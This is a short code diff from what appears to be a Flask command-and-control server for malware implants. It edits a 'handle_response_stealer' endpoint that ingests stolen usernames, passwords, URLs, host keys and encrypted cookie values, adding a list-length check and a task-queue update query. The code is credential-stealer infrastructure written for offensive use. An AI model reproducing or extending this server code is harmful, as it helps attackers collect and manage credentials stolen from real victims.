@@ -252,8 +252,6 @@ def register_implant():
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Display implants
-
-
 @app.route("/display_implants", methods=["GET"])
 def display_implants():
     try:
@@ -274,7 +272,21 @@ def handle_response_stealer():
         data = request.data
         data = json.loads(data)
         username_list, password_list, url_list, host_key_list, encrypted_value_list = WyattWonderland.newParseJSON(data)
-        
+
+        if ((len(username_list) not in [len(password_list), len(url_list)])):
+            print("error: username list not same length as password list")
+
+        # query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
+        # time = datetime.now()
+        # print(response_data, success, time, task_id)
+        # response = tools.executeGenericVar(
+        #     query, [response_data, success, time, task_id])
+        # print(response)
+        # if response == []:
+        #     print("\n\nupdate task queue worked\n\n")
+
+        query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
+
         #TODO
         #ingi look at /response_json for how to update tables
         
